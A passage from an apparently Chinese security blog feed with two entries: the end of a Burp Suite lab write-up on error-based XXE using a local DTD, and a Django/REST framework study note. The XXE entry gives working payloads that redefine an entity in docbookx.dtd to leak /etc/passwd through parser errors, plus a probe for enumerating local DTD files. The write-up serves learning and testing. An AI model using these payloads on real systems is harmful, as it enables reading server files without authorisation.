Sharoglazov率先提出，在<a href="https://portswigger.net/blog/top-10-web-hacking-techniques-of-2018#7">2018年</a>我们的<a href="https://portswigger.net/blog/top-10-web-hacking-techniques-of-2018#7">十大网络黑客技术中</a>排名第七。</p><p>例如，假设服务器文件系统上有一个DTD文件<code>/usr/local/app/schema.dtd</code>，并且此DTD文件定义了一个名为<code>custom_entity</code>的实体。攻击者可以通过提交混合DTD 来触发包含<code>/etc/passwd</code>文件内容的XML分析错误消息，如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///usr/local/app/schema.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">custom_entity</span> <span class="meta-string">&#x27;</span></span></span></span><br><span class="line"><span class="meta-string"><span class="meta"><span class="meta">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta-string"><span class="meta"><span class="meta">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta-string"><span class="meta"><span class="meta">&amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta-string"><span class="meta"><span class="meta">&amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta-string"><span class="meta"><span class="meta">&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>该DTD执行以下步骤：</p><ul><li>定义一个名为local_dtd的XML参数实体，其中包含本地服务器文件系统上存在的外部DTD文件的内容。</li><li>重新定义名为custom_entity的XML参数实体，该参数实体已经在<code>/usr/local/app/schema.dtd</code>中定义。该实体将触发包含/etc/passwd文件内容的错误消息。</li><li>使用local_dtd实体，解释外部<code>usr/local/app/schema.dtd</code>dtd实体，包括custom_entity实体的重新定义值。将导致，并返回错误消息。</li></ul><p>由于此XXE攻击涉及重新使用服务器文件系统上的现有DTD，因此关键的要求是找到合适的文件。</p><p>这实际上非常简单。因为应用程序返回了XML解析器抛出的任何错误消息，所以只需尝试从内部DTD中加载它们，就可以轻松枚举本地DTD文件。</p><p>例如，使用GNOME桌面环境的Linux系统通常在DDT文件<code>/usr/share/yelp/dtd/docbookx.dtd</code>。</p><p>可以通过提交以下XXE有效负载来测试该文件是否存在，如果缺少该文件，则会导致错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;%local_dtd;]&gt;</span><br></pre></td></tr></table></figure><p>在测试了常见DTD文件列表以找到存在的文件之后，需要获取该文件的副本并对其进行检查，以找到可以重新定义的实体。</p><p>由于包括DTD文件的许多常见系统都是开源的，因此通常可以通过互联网搜索快速获取文件的副本。</p><p><strong>本地dtd文件可以通过以下请求来测试：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p><img src="2.9.1.png" alt="2.9.1"></p><p>没有返回错误信息，说明存在该dtd文件</p><p><strong>exp:</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">//本地dtd文件地址</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamso</span> <span class="meta-string">&#x27;</span></span></span></span><br><span class="line"><span class="meta-string"><span class="meta"><span class="meta">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta-string"><span class="meta"><span class="meta">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta-string"><span class="meta"><span class="meta">&amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta-string"><span class="meta"><span class="meta">&amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta-string"><span class="meta"><span class="meta">&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="2.9.2.png" alt="2.9.2"></p><p>参考链接：</p><p><a href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite实验室 </tag>
            
            <tag> xxe漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>django学习记录</title>
      <link href="/2019/07/05/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/07/05/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>最近做毕设用到了django，这里简单记录一下开发过程。项目使用前后端分离，使用django的restframework框架写接口非常的便捷。这里简单记录一下学习过程。</p><h1 id="0x01-django基本操作"><a href="#0x01-django基本操作" class="headerlink" title="0x01 django基本操作"></a>0x01 django基本操作</h1><h2 id="安装django："><a href="#安装django：" class="headerlink" title="安装django："></a>安装django：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install django==3.1.7-i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><h2 id="创建一个项目："><a href="#创建一个项目：" class="headerlink" title="创建一个项目："></a>创建一个项目：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">django-admin startproject 项目名称</span><br></pre></td></tr></table></figure><p><img src="/Users/h11ba1/Desktop/markdown/%E5%8D%9A%E5%AE%A2/django%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/1.1.jpg" alt="1.1"></p><h2 id="创建一个应用："><a href="#创建一个应用：" class="headerlink" title="创建一个应用："></a>创建一个应用：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py startapp App</span><br></pre></td></tr></table></figure><h2 id="项目配置文件注册应用："><a href="#项目配置文件注册应用：" class="headerlink" title="项目配置文件注册应用："></a>项目配置文件注册应用：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">django_test/django_test/settings.py</span><br><span class="line"></span><br><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="string">&#x27;django.contrib.admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.auth&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.contenttypes&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.sessions&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.messages&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.staticfiles&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;App&#x27;</span>,      <span class="comment"># 注册新添加的应用</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><img src="1.2.jpg" alt="1.1"></p><h2 id="汉化及时区配置"><a href="#汉化及时区配置" class="headerlink" title="汉化及时区配置"></a>汉化及时区配置</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LANGUAGE_CODE = <span class="string">&#x27;zh-hans&#x27;</span></span><br><span class="line"></span><br><span class="line">TIME_ZONE = <span class="string">&#x27;Asia/Shanghai&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="django启动"><a href="#django启动" class="headerlink" title="django启动"></a>django启动</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python manage.py runserver 默认启动只允许本地访问</span><br><span class="line"></span><br><span class="line">python manage.py runserver 0.0.0.0:8080  如果在docker容器中使用则要采用此启动方法</span><br></pre></td></tr></table></figure><p><img src="1.3.png" alt="1.3"></p><h1 id="0x02-django-模型字段"><a href="#0x02-django-模型字段" class="headerlink" title="0x02 django 模型字段"></a>0x02 django 模型字段</h1><p>官方文档：<a href="https://docs.djangoproject.com/zh-hans/3.1/ref/models/fields/#django.db.models.Field">https://docs.djangoproject.com/zh-hans/3.1/ref/models/fields/#django.db.models.Field</a></p><p><a href="https://www.liujiangblog.com/course/django/95">https://www.liujiangblog.com/course/django/95</a></p><table><thead><tr><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>AutoField</td><td>一个自动增加的整数类型字段。通常你不需要自己编写它，Django会自动帮你添加字段：<code>id = models.AutoField(primary_key=True)</code>，这是一个自增字段，从1开始计数。如果你非要自己设置主键，那么请务必将字段设置为<code>primary_key=True</code>。Django在一个模型中只允许有一个自增字段，并且该字段必须为主键！</td></tr><tr><td>BigAutoField</td><td>64位整数类型自增字段，数字范围更大，从1到9223372036854775807</td></tr><tr><td>BigIntegerField</td><td>64位整数字段（看清楚，非自增），类似IntegerField ，-9223372036854775808 到9223372036854775807。在Django的模板表单里体现为一个<code>NumberInput</code>标签。</td></tr><tr><td>BinaryField</td><td>二进制数据类型。较少使用。</td></tr><tr><td><strong>BooleanField</strong></td><td>布尔值类型。默认值是None。在HTML表单中体现为CheckboxInput标签。如果设置了参数null=True，则表现为NullBooleanSelect选择框。可以提供default参数值，设置默认值。</td></tr><tr><td><strong>CharField</strong></td><td>最常用的类型，字符串类型。必须接收一个max_length参数，表示字符串长度不能超过该值。默认的表单标签是text input。</td></tr><tr><td><strong>DateField</strong></td><td><code>class DateField(auto_now=False, auto_now_add=False, **options)</code> , 日期类型。一个Python中的datetime.date的实例。在HTML中表现为DateInput标签。在admin后台中，Django会帮你自动添加一个JS日历表和一个“Today”快捷方式，以及附加的日期合法性验证。两个重要参数：（参数互斥，不能共存） <code>auto_now</code>:每当对象被保存时将字段设为当前日期，常用于保存最后修改时间。<code>auto_now_add</code>：每当对象被创建时，设为当前日期，常用于保存创建日期(注意，它是不可修改的)。设置上面两个参数就相当于给field添加了<code>editable=False</code>和<code>blank=True</code>属性。如果想具有修改属性，请用default参数。例子：<code>pub_time = models.DateField(auto_now_add=True)</code>，自动添加发布时间。</td></tr><tr><td>DateTimeField</td><td>日期时间类型。Python的datetime.datetime的实例。与DateField相比就是多了小时、分和秒的显示，其它功能、参数、用法、默认值等等都一样。</td></tr><tr><td>DecimalField</td><td>固定精度的十进制小数。相当于Python的Decimal实例，必须提供两个指定的参数！参数<code>max_digits</code>：最大的位数，必须大于或等于小数点位数 。<code>decimal_places</code>：小数点位数，精度。 当<code>localize=False</code>时，它在HTML表现为NumberInput标签，否则是textInput类型。例子：储存最大不超过999，带有2位小数位精度的数，定义如下：<code>models.DecimalField(..., max_digits=5, decimal_places=2)</code>。</td></tr><tr><td>DurationField</td><td>持续时间类型。存储一定期间的时间长度。类似Python中的timedelta。在不同的数据库实现中有不同的表示方法。常用于进行时间之间的加减运算。但是小心了，这里有坑，PostgreSQL等数据库之间有兼容性问题！</td></tr><tr><td><strong>EmailField</strong></td><td>邮箱类型，默认max_length最大长度254位。使用这个字段的好处是，可以使用Django内置的EmailValidator进行邮箱格式合法性验证。</td></tr><tr><td><strong>FileField</strong></td><td><code>class FileField(upload_to=None, max_length=100, **options)</code>上传文件类型，后面单独介绍。</td></tr><tr><td>FilePathField</td><td>文件路径类型，后面单独介绍</td></tr><tr><td>FloatField</td><td>浮点数类型，对应Python的float。参考整数类型字段。</td></tr><tr><td><strong>ImageField</strong></td><td>图像类型，后面单独介绍。</td></tr><tr><td><strong>IntegerField</strong></td><td>整数类型，最常用的字段之一。取值范围-2147483648到2147483647。在HTML中表现为NumberInput或者TextInput标签。</td></tr><tr><td><strong>GenericIPAddressField</strong></td><td><code>class GenericIPAddressField(protocol=&#39;both&#39;, unpack_ipv4=False, **options)</code>,IPV4或者IPV6地址，字符串形式，例如<code>192.0.2.30</code>或者<code>2a02:42fe::4</code>。在HTML中表现为TextInput标签。参数<code>protocol</code>默认值为‘both’，可选‘IPv4’或者‘IPv6’，表示你的IP地址类型。</td></tr><tr><td>JSONField</td><td>JSON类型字段。Django3.1新增。签名为<code>class JSONField(encoder=None,decoder=None,**options)</code>。其中的encoder和decoder为可选的编码器和解码器，用于自定义编码和解码方式。如果为该字段提供default值，请务必保证该值是个不可变的对象，比如字符串对象。</td></tr><tr><td>PositiveBigIntegerField</td><td>正的大整数，0到9223372036854775807</td></tr><tr><td>PositiveIntegerField</td><td>正整数，从0到2147483647</td></tr><tr><td>PositiveSmallIntegerField</td><td>较小的正整数，从0到32767</td></tr><tr><td>SlugField</td><td>slug是一个新闻行业的术语。一个slug就是一个某种东西的简短标签，包含字母、数字、下划线或者连接线，通常用于URLs中。可以设置max_length参数，默认为50。</td></tr><tr><td>SmallAutoField</td><td>Django3.0新增。类似AutoField，但是只允许1到32767。</td></tr><tr><td>SmallIntegerField</td><td>小整数，包含-32768到32767。</td></tr><tr><td><strong>TextField</strong></td><td>用于储存大量的文本内容，在HTML中表现为Textarea标签，最常用的字段类型之一！如果你为它设置一个max_length参数，那么在前端页面中会受到输入字符数量限制，然而在模型和数据库层面却不受影响。只有CharField才能同时作用于两者。</td></tr><tr><td>TimeField</td><td>时间字段，Python中datetime.time的实例。接收同DateField一样的参数，只作用于小时、分和秒。</td></tr><tr><td><strong>URLField</strong></td><td>一个用于保存URL地址的字符串类型，默认最大长度200。</td></tr><tr><td><strong>UUIDField</strong></td><td>用于保存通用唯一识别码（Universally Unique Identifier）的字段。使用Python的UUID类。在PostgreSQL数据库中保存为uuid类型，其它数据库中为char(32)。这个字段是自增主键的最佳替代品，后面有例子展示。</td></tr></tbody></table><h1 id="0x03-django-QuerySetAPI"><a href="#0x03-django-QuerySetAPI" class="headerlink" title="0x03 django QuerySetAPI"></a>0x03 django QuerySetAPI</h1><p>官方文档：<a href="https://docs.djangoproject.com/zh-hans/3.1/ref/models/querysets/#field-lookups">https://docs.djangoproject.com/zh-hans/3.1/ref/models/querysets/#field-lookups</a></p><p>QuerySetAPI 函数：<a href="https://www.liujiangblog.com/course/django/130">https://www.liujiangblog.com/course/django/130</a></p><table><thead><tr><th>方法名</th><th>解释</th></tr></thead><tbody><tr><td><strong>filter()</strong></td><td>过滤查询对象。</td></tr><tr><td><strong>exclude()</strong></td><td>排除满足条件的对象</td></tr><tr><td><strong>annotate()</strong></td><td>为查询集添加注解或者聚合内容</td></tr><tr><td><strong>order_by()</strong></td><td>对查询集进行排序</td></tr><tr><td><strong>reverse()</strong></td><td>反向排序</td></tr><tr><td><strong>distinct()</strong></td><td>对查询集去重</td></tr><tr><td><strong>values()</strong></td><td>返回包含对象具体值的字典的QuerySet</td></tr><tr><td><strong>values_list()</strong></td><td>与values()类似，只是返回的是元组而不是字典。</td></tr><tr><td>dates()</td><td>根据日期获取查询集</td></tr><tr><td>datetimes()</td><td>根据时间获取查询集</td></tr><tr><td><strong>none()</strong></td><td>创建空的查询集</td></tr><tr><td><strong>all()</strong></td><td>获取所有的对象</td></tr><tr><td>union()</td><td>并集</td></tr><tr><td>intersection()</td><td>交集</td></tr><tr><td>difference()</td><td>差集</td></tr><tr><td><strong>select_related()</strong></td><td>附带查询关联对象，利用缓存提高效率</td></tr><tr><td><code>prefetch_related()</code></td><td>预先查询，提高效率</td></tr><tr><td>extra()</td><td>将被废弃的方法</td></tr><tr><td>defer()</td><td>不加载指定字段，也就是排除一些列的数据</td></tr><tr><td>only()</td><td>只加载指定的字段，仅选择需要的字段</td></tr><tr><td>using()</td><td>选择数据库</td></tr><tr><td><code>select_for_update()</code></td><td>锁住选择的对象，直到事务结束。</td></tr><tr><td>raw()</td><td>接收一个原始的SQL查询</td></tr></tbody></table><h1 id="0x04-django-rest-framework"><a href="#0x04-django-rest-framework" class="headerlink" title="0x04 django rest framework"></a>0x04 django rest framework</h1><p>drf提供了强大的封装，可以快速编写符合restful风格api。</p><h2 id="restful-api："><a href="#restful-api：" class="headerlink" title="restful api："></a>restful api：</h2><p>一篇不错的解释文章：<a href="https://juejin.cn/post/6844904071640383502">https://juejin.cn/post/6844904071640383502</a></p><p>在接口的定义中引入了请求方法，使api接口跟简洁。例如：<br><img src="/Users/h11ba1/Desktop/markdown/%E5%8D%9A%E5%AE%A2/django%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/4.1.png" alt="4.1"></p><p>同样的接口通过请求方式的不同，具有不同的操作效果。</p><h2 id="django-restframework安装："><a href="#django-restframework安装：" class="headerlink" title="django restframework安装："></a>django restframework安装：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install djangorestframework</span><br></pre></td></tr></table></figure><p>注册到配置文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="string">&#x27;django.contrib.admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.auth&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.contenttypes&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.sessions&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.messages&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.staticfiles&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;rest_framework&#x27;</span>,  <span class="comment">#注册restframework框架</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="编写实例："><a href="#编写实例：" class="headerlink" title="编写实例："></a>编写实例：</h2><h3 id="注册模型："><a href="#注册模型：" class="headerlink" title="注册模型："></a>注册模型：</h3><p>User/models.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create your models here.</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="params">models.Model</span>):</span></span><br><span class="line">    username = models.CharField(max_length=<span class="number">100</span>, unique=<span class="literal">True</span>, default=<span class="string">&#x27;test&#x27;</span>, verbose_name=<span class="string">&#x27;用户名&#x27;</span>)</span><br><span class="line">    password = models.CharField(max_length=<span class="number">100</span>, default=<span class="string">&#x27;test&#x27;</span>, verbose_name=<span class="string">&#x27;密码&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">&#x27;User&#x27;</span></span><br><span class="line">        verbose_name = <span class="string">&#x27;用户信息&#x27;</span></span><br><span class="line">        verbose_name_plural = verbose_name</span><br></pre></td></tr></table></figure><p>迁移申请：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py makemigrations</span><br></pre></td></tr></table></figure><p>创建表结构：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure><h3 id="注册序列化器："><a href="#注册序列化器：" class="headerlink" title="注册序列化器："></a>注册序列化器：</h3><p>User/serializers.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> serializers</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> User</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserSerialize</span>(<span class="params">serializers.ModelSerializer</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;定义序列化器&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = User</span><br><span class="line">        fields = <span class="string">&#x27;__all__&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="注册视图："><a href="#注册视图：" class="headerlink" title="注册视图："></a>注册视图：</h3><p>User/views.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> User</span><br><span class="line"><span class="comment"># drf</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.viewsets <span class="keyword">import</span> ModelViewSet</span><br><span class="line"><span class="keyword">from</span> .serializers <span class="keyword">import</span> UserSerialize</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserViewSet</span>(<span class="params">ModelViewSet</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;定义类视图&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 指定查询集</span></span><br><span class="line">    queryset = User.objects.<span class="built_in">all</span>()</span><br><span class="line">    <span class="comment"># 指定序列化器</span></span><br><span class="line">    serializer_class = UserSerialize</span><br></pre></td></tr></table></figure><h3 id="注册路由："><a href="#注册路由：" class="headerlink" title="注册路由："></a>注册路由：</h3><p>User/urls.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> routers</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">]</span><br><span class="line">router = routers.DefaultRouter()  <span class="comment"># 创建路由器</span></span><br><span class="line">router.register(<span class="string">r&#x27;users&#x27;</span>, views.UserViewSet)  <span class="comment"># 注册路由</span></span><br><span class="line">urlpatterns += router.urls  <span class="comment"># 把生成好的路由拼接到urlpatterns里去</span></span><br></pre></td></tr></table></figure><h3 id="查看视图接口："><a href="#查看视图接口：" class="headerlink" title="查看视图接口："></a>查看视图接口：</h3><p><img src="4.2.png" alt="4.1"></p><h1 id="0x05-生成接口文档"><a href="#0x05-生成接口文档" class="headerlink" title="0x05 生成接口文档"></a>0x05 生成接口文档</h1><p>使用drf接口编写非常快速。为了更加详细的查看和测试接口可以引入swagger接口文档。</p><h2 id="安装drf-yasg2："><a href="#安装drf-yasg2：" class="headerlink" title="安装drf_yasg2："></a>安装drf_yasg2：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install drf_yasg2</span><br></pre></td></tr></table></figure><h2 id="注册应用："><a href="#注册应用：" class="headerlink" title="注册应用："></a>注册应用：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="string">&#x27;django.contrib.admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.auth&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.contenttypes&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.sessions&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.messages&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.staticfiles&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;drf_yasg2&#x27;</span>,     <span class="comment">#swagger接口文档</span></span><br><span class="line">    <span class="string">&#x27;rest_framework&#x27;</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="注册路由：-1"><a href="#注册路由：-1" class="headerlink" title="注册路由："></a>注册路由：</h2><p>项目/Urls.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;admin/&#x27;</span>, admin.site.urls),</span><br><span class="line">    <span class="comment"># user 路由</span></span><br><span class="line">    path(<span class="string">&#x27;apis/&#x27;</span>, include(<span class="string">&#x27;User.urls&#x27;</span>)),</span><br><span class="line"></span><br><span class="line">    <span class="comment"># swagger</span></span><br><span class="line">    re_path(<span class="string">r&#x27;^doc(?P&lt;format&gt;\.json|\.yaml)$&#x27;</span>,schema_view.without_ui(cache_timeout=<span class="number">0</span>), name=<span class="string">&#x27;schema-json&#x27;</span>),  <span class="comment">#&lt;-- 这里</span></span><br><span class="line">    path(<span class="string">&#x27;doc/&#x27;</span>, schema_view.with_ui(<span class="string">&#x27;swagger&#x27;</span>, cache_timeout=<span class="number">0</span>), name=<span class="string">&#x27;schema-swagger-ui&#x27;</span>),  <span class="comment">#&lt;-- 这里</span></span><br><span class="line">    path(<span class="string">&#x27;redoc/&#x27;</span>, schema_view.with_ui(<span class="string">&#x27;redoc&#x27;</span>, cache_timeout=<span class="number">0</span>), name=<span class="string">&#x27;schema-redoc&#x27;</span>),  <span class="comment">#&lt;-- 这里</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><img src="/Users/h11ba1/Desktop/markdown/%E5%8D%9A%E5%AE%A2/django%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/5.1.png" alt="5.1"></p><h1 id="0x06-参考："><a href="#0x06-参考：" class="headerlink" title="0x06 参考："></a>0x06 参考：</h1><p><a href="https://www.liujiangblog.com/course/django/130">https://www.liujiangblog.com/course/django/130</a></p><p><a 